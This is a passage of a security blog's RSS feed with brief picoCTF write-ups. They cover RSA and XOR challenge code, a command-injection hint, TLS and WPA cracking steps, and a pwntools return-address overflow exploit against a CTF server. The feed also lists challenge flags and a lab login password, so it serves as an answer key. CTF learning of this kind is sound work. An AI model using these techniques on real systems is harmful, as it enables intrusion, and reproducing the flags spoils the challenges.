= (cmd *)malloc(sizeof(user)); while(1){ printMenu(); processInput(); //if(user){ doProcess(user); //} } return 0; } :::</description></item><item><title>PicoCTF - Very Smooth</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---very-smooth/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/rsa/picoctf---very-smooth/index.html</guid><description>PicoCTF - Very Smooth tags: PicoCTF CTF Crypto Background $p-1$ Smooth
Source code :::spoiler Source Code
#!/usr/bin/python from binascii import hexlify from gmpy2 import * import math import os import sys if sys.version_info &lt; (3, 9): math.gcd = gcd math.lcm = lcm _DEBUG = False FLAG = open('flag.txt').read().strip() FLAG = mpz(hexlify(FLAG.encode()), 16) SEED = mpz(hexlify(os.urandom(32)).decode(), 16) STATE = random_state(SEED) def get_prime(state, bits): return next_prime(mpz_urandomb(state, bits) | (1 &lt;&lt; (bits - 1))) def get_smooth_prime(state, bits, smoothness=16): p = mpz(2) p_factors = [p] while p.bit_length() &lt; bits - 2 * smoothness: factor = get_prime(state, smoothness) p_factors.append(factor) p *= factor bitcnt = (bits - p.bit_length()) // 2 while True: prime1 = get_prime(state, bitcnt) prime2 = get_prime(state, bitcnt) tmpp = p * prime1 * prime2 if tmpp.bit_length() &lt; bits: bitcnt += 1 continue if tmpp.bit_length() > bits: bitcnt -= 1 continue if is_prime(tmpp + 1): p_factors.append(prime1) p_factors.append(prime2) p = tmpp + 1 break p_factors.sort() return (p, p_factors) e = 0x10001 while True: p, p_factors = get_smooth_prime(STATE, 1024, 16) if len(p_factors) != len(set(p_factors)): continue # Smoothness should be different or some might encounter issues. q, q_factors = get_smooth_prime(STATE, 1024, 17) if len(q_factors) != len(set(q_factors)): continue factors = p_factors + q_factors if e not in factors: break if _DEBUG: import sys sys.stderr.write(f'p = {p.digits(16)}\n\n') sys.stderr.write(f'p_factors = [\n') for factor in p_factors: sys.stderr.write(f' {factor.digits(16)},\n') sys.stderr.write(f']\n\n') sys.stderr.write(f'q = {q.digits(16)}\n\n') sys.stderr.write(f'q_factors = [\n') for factor in q_factors: sys.stderr.write(f' {factor.digits(16)},\n') sys.stderr.write(f']\n\n') n = p * q m = math.lcm(p - 1, q - 1) d = pow(e, -1, m) c = pow(FLAG, e, n) print(f'n = {n.digits(10)}') print(f'c = {c.digits(10)}') :::</description></item><item><title>PicoCTF - VNE</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---vne/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---vne/index.html</guid><description>PicoCTF - VNE Background System Environment Command Injection
Description &amp; Hint We’ve got a binary that can list directories as root, try it out !! ssh to saturn.picoctf.net:53176, and run the binary named “bin” once connected. Login as ctf-player with the password, d137d16e
Hint 1: Have you checked the content of the /root folder Hint 2: Find a way to add more instructions to the ls Source Code :::spoiler IDA Main Function</description></item><item><title>PicoCTF - WebNet0</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---webnet0/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---webnet0/index.html</guid><description>PicoCTF - WebNet0 Background 解密TLS協議全記錄之利用wireshark解密
Recon 這一題其實就只是利用wireshark把訊息解密就這樣，所以看了一些文章後就按圖施工就好，解密完後就直接string search就找到了
Exploit - TLS Decrypt 在Edit/Preferences/RSA Keys/中Add new keyfile 加入題目給的private key file後記得要重新開啟該pcap file</description></item><item><title>PicoCTF - WhitePages</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/general/picoctf---whitepages/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/general/picoctf---whitepages/index.html</guid><description>PicoCTF - WhitePages tags: PicoCTF CTF Misc Challenge: WhitePages
Source code :::spoiler source text
:::
Exploit - Binary Encoding If you use sublime editor to observe the file, then you may see the result as below. In unicode, &lt;0x2003> is a kind of white space, then some gap between &lt;0x2003> is a normal white space. Obviously, this is a binary encoding(&lt;0x2003> is 0 and normal white space is 1)</description></item><item><title>PicoCTF - Who are you?</title><link>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---who-are-you_/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/web/picoctf---who-are-you_/index.html</guid><description>PicoCTF - Who are you? tags: PicoCTF CTF Web Background 【Chrome 85 更新】淺談 Referer-Policy 和更新影響 HTTP Referer 是什麼? 當使用者訪問網站時，會發送請求 (request) 給伺服器主機，而請求 header 中會有一個欄位是「referer」，而此欄位會存放當前請求來源的位置，也就是說請求的來源頁面。
舉個例子：當小明從「iT邦幫忙」網站中點擊連結後，進入「Max 行銷誌」網站時，所發送的 request 請求 referer 就會是 https://ithelp.ithome.com.tw/ 的網址。
RFC 2616 - Date The Date general-header field represents the date and time at which the message was originated, having the same semantics as orig-date in RFC 822. The field value is an HTTP-date, as described in section 3.3.1; it MUST be sent in RFC 1123 [8]-date format.</description></item><item><title>PicoCTF - Wireshark twoo twooo two twoo...</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---wireshark-twoo-twooo-two-twoo_/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---wireshark-twoo-twooo-two-twoo_/index.html</guid><description>PicoCTF - Wireshark twoo twooo two twoo… tags: PicoCTF CTF Misc Challenge: Wireshark twoo twooo two twoo…
Exploit - DNS + sub-domain Statistic Using statistic to analyze http requests and you’ll see that there is /flag and / in address 18.217.1.57. Maybe it’s a clue or key to find flag String search technique
$ strings shark2.pcapng | grep "pico" picoCTF{bfe48e8500c454d647c55a4471985e776a07b26cba64526713f43758599aa98b} picoCTF{bda69bdf8f570a9aaab0e4108a0fa5f64cb26ba7d2269bb63f68af5d98b98245} picoCTF{fe83bcb6cfd43d3b79392f6a4232685f6ed4e7a789c2ce559cf3c1ab6adbe34b} picoCTF{711d3893d90f100c15e10ef4842abeed3a830f8237c1257cd47389646da97810} picoCTF{3cf1e22d489fcfb6bb312a34f46c8699989ed043406134331452d11ce73cd59e} picoCTF{b4cc138bb0f7f9da7e35085e349555aa6d00bdca3b021c1fe8663c0a422ce0d7} picoCTF{41b8a1a796bd8d202016f75bc5b38889e9ea06007e6b22fc856d380fb7573133} ... You’ll find tons of fake flag. Obviously, it’s a trap to distract you.</description></item><item><title>PicoCTF - Wizardlike</title><link>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---wizardlike/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/reverse/picoctf---wizardlike/index.html</guid><description>PicoCTF - Wizardlike Recon 這一題蠻有趣的，如果只是單純執行程式碼，會發現是一個迷宮的遊戲，不過走越多會發現兩個現象
遊戲本身根本無法破關 有一些"道路"回隨著角色本身的移動慢慢浮現出來 我也不知道是哪來的想法直覺想要看他的地圖，因為看IDA翻出來的code，貌似有十個關卡，而如果把地圖翻出來會發現每一個關卡總共會有10000個字元，然後每一列都是100個字元呈現，然後就發現他其實是用地圖的方式呈現他的flag，則我們可以先把10個關卡的所有字元另存一個檔案(純手工)，再寫一點點script就可以把flag還原
Exploit - 通靈 f = open('./cipher.txt', 'r').read() pt = open('./flag.txt', 'w') flag = "\n".join([f[100 * i : 100 * i + 100] for i in range(len(f) // 100)]) pt.write(flag) :::spoiler flag
######### #.......# ......#................................... #.......# ....................####.#####.#####..###. #........ .####.#..###..###..#.......#...#......#... #.......# .# #.#.#....# #.#.......#...###...#.... #.......# .####.#.#....# #.#.......#...#......#... #.......# .#....#..###..###...####...#...#......###. #.......# .#........................................ #.......# .......................................... #.......# #.......# #.......# #.......# #.......# #......># ######### #####. ............................................................. #.&ltlt;..............#. ..###.. #...............#.. .#...#. #..............#......###.. #...#.......#...#.. .#...#. #..###.....###..#. ..###.. #...#...#...#...# ....... #......#>#......# ....... #...............# #...#.......#...# #..###.....###..# #...#.......#...# #...............# #...............# #...............# ################# ... .. ....... .&lt;. ####. .#####. ... ...#.. .#..... ... ...#....###... ..>#.. .#..... ####. .#..... .. ....... ....... ######################## #&lt;.............#.......# #..............#.#...#.# #..............#.#...#.# #..............#.#####.# #..............#.....#.# #..............#.....#.# #..............#.......# #..............#.......# ######################## ....... .&lt;..... ....... ....... ....... ....... ....... ....... ....... ....... ....... .....>. ....... ####### ....... .####.. .#...#. .####.. .#...#. .####.. ....... ....... ... .&lt;......... ........... ... .. .. .. .. .. .. .. .............. ..##########.. .# #. .# ....... #. .# ..###.. #. .# .#...#. #. .# .#...#. #. .# .#...#. #. .# ..###.. #. .# ....... #. .# ....... #. .# #. ..##########.. .............> ######################### #&ltltdescription></item><item><title>PicoCTF - WPA-ing Out</title><link>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---wpa-ing-out/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/misc/flow/picoctf---wpa-ing-out/index.html</guid><description>PicoCTF - WPA-ing Out tags: PicoCTF CTF Misc Challenge: WPA-ing Out
Background Day 26 Wireless Attacks-無線攻擊(aircrack-ng)
Description &amp; Hint I thought that my password was super-secret, but it turns out that passwords passed over the AIR can be CRACKED, especially if I used the same wireless network password as one in the rockyou.txt credential dump. Use this pcap file and the rockyou wordlist. The flag should be entered in the picoCTF{XXXXXX} format.</description></item><item><title>PicoCTF - x-sixty-what</title><link>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---x-sixty-what/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/pwn/picoctf---x-sixty-what/index.html</guid><description>PicoCTF - x-sixty-what Source code :::spoiler
:::
Recon 這一題有點奇怪，沒有想像中簡單，看起來就是一個簡單的return 2 function的問題，但是看了objdump的flag function原本應該是0x401236，但是會友segmentation fault，看了其他的WP1，發現應該return到0x40123b，不太知道為甚麼
第一張是return 2 0x401236 第二張是return 2 0x40123b Exploit 用動態的方式看offset $$ 0x7fffffffd758 - 0x00007fffffffd710 = 0x48 $$ from pwn import * r = remote('saturn.picoctf.net', 58166) # r = process('./vuln') context.arch = 'amd64' raw_input() print(r.recvline().strip().decode()) payload = b'a'*0x48 + p64(0x40123b) print(payload) r.sendline(payload) r.interactive() Flag: picoCTF{b1663r_15_b3773r_e79d5a75}</description></item><item><title>PicoCTF - XtraORdinary</title><link>https://bernie6401.github.io/security/practice/picoctf/crypto/classic/picoctf---xtraordinary/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/practice/picoctf/crypto/classic/picoctf---xtraordinary/index.html</guid><description>PicoCTF - XtraORdinary Background How to Convert Hex String to Bytes in Python? Python 好用模組介紹 - itertools &amp; more-itertools Python File readline() Method Python append to a file
Source code :::spoiler Source Code
#!/usr/bin/env python3 from random import randint with open('flag.txt', 'rb') as f: flag = f.read() with open('secret-key.txt', 'rb') as f: key = f.read() def encrypt(ptxt, key): ctxt = b'' for i in range(len(ptxt)): a = ptxt[i] b = key[i % len(key)] ctxt += bytes([a ^ b]) return ctxt ctxt = encrypt(flag, key) random_strs = [ b'my encryption method', b'is absolutely impenetrable', b'and you will never', b'ever', b'ever', b'ever', b'ever', b'ever', b'ever', b'break it' ] for random_str in random_strs: for i in range(randint(0, pow(2, 8))): for j in range(randint(0, pow(2, 6))): for k in range(randint(0, pow(2, 4))): for l in range(randint(0, pow(2, 2))): for m in range(randint(0, pow(2, 0))): ctxt = encrypt(ctxt, random_str) with open('output.txt', 'w') as f: f.write(ctxt.hex()) :::</description></item><item><title>PicoCTF 2023</title><link>https://bernie6401.github.io/security/competition/picoctf-2023/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/competition/picoctf-2023/index.html</guid><description>PicoCTF 2023 :::spoiler [TOC] :::
Crypto HideToSee Recon 這一題比較像是Misc題目，比賽的時候想了很久都沒進展，賽後看了write up才覺得異常簡單，當初應該也是有往這方面想，但沒有用steghide
Exploit - Steghide + Atbash 先用steghide解密出隱藏的文檔 $ steghide extract -sf atbash.jpg 用online tool解密 Reverse Reverse IDA Flag: picoCTF{3lf_r3v3r5ing_succe55ful_8108250b}
Safe Opener 2 Strings search Flag: picoCTF{SAf3_0p3n3rr_y0u_solv3d_it_ccb5525e}
timer Use mobsf Flag: picoCTF{t1m3r_r3v3rs3d_succ355fully_17496}
Ready Gladiator 0 ??? picoCTF{h3r0_t0_z3r0_4m1r1gh7_a220a377} Forensics hideme Use binwalk to observe that it should be a zip file.
$ binwalk flag.png DECIMAL HEXADECIMAL DESCRIPTION -------------------------------------------------------------------------------- 0 0x0 PNG image, 512 x 504, 8-bit/color RGBA, non-interlaced 41 0x29 Zlib compressed data, compressed 39739 0x9B3B Zip archive data, at least v1.0 to extract, name: secret/ 39804 0x9B7C Zip archive data, at least v2.0 to extract, compressed size: 3037, uncompressed size: 3187, name: secret/flag.png 43076 0xA844 End of Zip archive, footer length: 22 Change extension to zip file and extract it</description></item></channel></rss>